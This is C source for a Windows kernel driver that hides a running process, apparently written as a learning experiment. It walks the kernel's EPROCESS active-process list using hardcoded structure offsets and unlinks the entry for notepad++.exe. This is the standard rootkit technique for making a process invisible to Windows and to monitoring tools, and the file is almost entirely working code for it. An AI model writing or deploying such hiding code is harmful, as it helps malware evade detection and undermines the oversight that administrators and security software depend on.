#include <Fltkernel.h>
extern "C"
{
	void HidingProcess() {

		// Get a pointer to EPROCESS structure
		PEPROCESS curentProcess = PsGetCurrentProcess();

		
		/**
		* 
		* For your information, processes are linked together in Windows using a circular chained list.
		* This link can be found in the EPROCESS structure via the ActiveProcessLink structure.
		* - ActiveProcessLink->Blink means the process behind the process in the list and
		* - ActiveProcessLink->Flink means the process in front of the process in the list.
		* 
		* 0x448 is the offset of the ActiveProcessLink structure in the EPROCESS structure
		* 
		*/

		// Get a pointer to ActiveProcessLink in EPROCESS structure
		PLIST_ENTRY curentProcessEntry = (PLIST_ENTRY)((PUCHAR)curentProcess + 0x448);
		PLIST_ENTRY processEntryBefore = curentProcessEntry->Blink;

		while (curentProcessEntry != processEntryBefore)
		{
			// Get name of process (0x5a8 offset of ImageNameFile in EPROCESS structure)
			PCHAR processName = (PCHAR)((PUCHAR)curentProcess + 0x5a8);

			// I've decided to make notepad++ invicible for windows
			if (strncmp("notepad++.exe", processName, 13) == 0) {
				DbgPrint("Process Name: %s hidden\n", processName);

				// I'm just deleting the process from the circular list
				PLIST_ENTRY processEntryBack = curentProcessEntry->Blink;
				PLIST_ENTRY processEntryFront = curentProcessEntry->Flink;
				curentProcessEntry->Blink->Flink = processEntryFront;
				curentProcessEntry->Flink->Blink = processEntryBack;
				curentProcessEntry->Flink = curentProcessEntry;
				curentProcessEntry->Blink = curentProcessEntry;
				curentProcessEntry = processEntryFront;

				// (- 0x448) To find the EPROCESS pointer from the ActiveProcessLink pointer
				curentProcess = (PEPROCESS)((PUCHAR)curentProcessEntry - 0x448);
				continue;
			}

			curentProcessEntry = curentProcessEntry->Flink;
			curentProcess = (PEPROCESS)((PUCHAR)curentProcessEntry - 0x448);
		}
	};

	void HidingProcessUnload(_In_ PDRIVER_OBJECT  DriverObject) {
		UNREFERENCED_PARAMETER(DriverObject);
		DbgPrint("- Hiding Process Driver Unload -");
	}

	_Use_decl_annotations_
		NTSTATUS HidingProcessCreate(
			_DEVICE_OBJECT* DeviceObject,
			_IRP* Irp
		) {
		UNREFERENCED_PARAMETER(DeviceObject);
		DbgPrint("- Hiding Process Driver Create -");
		Irp->IoStatus.Status = STATUS_SUCCESS;
		Irp->IoStatus.Information = 0;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return STATUS_SUCCESS;
	};

	_Use_decl_annotations_
		NTSTATUS HidingProcessClose(
			_DEVICE_OBJECT* DeviceObject,
			_IRP* Irp
		) {
		UNREFERENCED_PARAMETER(DeviceObject);
		DbgPrint("- Hiding Process Driver Close -");
		Irp->IoStatus.Status = STATUS_SUCCESS;
		Irp->IoStatus.Information = 0;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return STATUS_SUCCESS;
	};

	NTSTATUS DriverEntry(
		_In_ PDRIVER_OBJECT  DriverObject,
		_In_ PUNICODE_STRING RegistryPath
	) {
		UNREFERENCED_PARAMETER(RegistryPath);
		DriverObject->DriverUnload = HidingProcessUnload;
		DbgPrint("- Hiding Process Driver Loaded -");

		/**
		* It doesn't do anything, it was just to experiment with the Major functions.
		* It just allows us to have a message in windbg about the loading of the driver and the opening/closing of the device.
		*/ 
		DriverObject->MajorFunction[IRP_MJ_CREATE] = HidingProcessCreate;
		DriverObject->MajorFunction[IRP_MJ_CLOSE] = HidingProcessClose;

		/**
		* Function to hide a process from windows
		*/
		HidingProcess();

		return STATUS_SUCCESS;
	}
}